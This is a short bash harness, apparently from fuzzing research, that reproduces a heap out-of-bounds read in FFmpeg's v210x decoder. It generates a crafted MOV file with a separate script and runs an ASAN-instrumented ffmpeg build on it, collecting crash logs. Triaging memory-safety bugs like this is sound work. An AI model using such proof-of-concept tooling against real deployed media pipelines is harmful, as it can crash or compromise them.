#!/bin/bash
# VULN-001 PoC runner: Heap OOB Read in v210x decode_frame() (v210x.c:48)
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating crafted MOV file..."
python3 vuln_001_gen.py

echo "[*] Running ffmpeg with ASAN (forcing v210x decoder)..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  "$BIN" -vcodec v210x -i vuln_001_input.mov -f null - \
  > vuln_001_result.txt 2>&1 || true

# Collect any ASAN log files written by the process
cat asan.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "[*] Done. Results in vuln_001_result.txt"
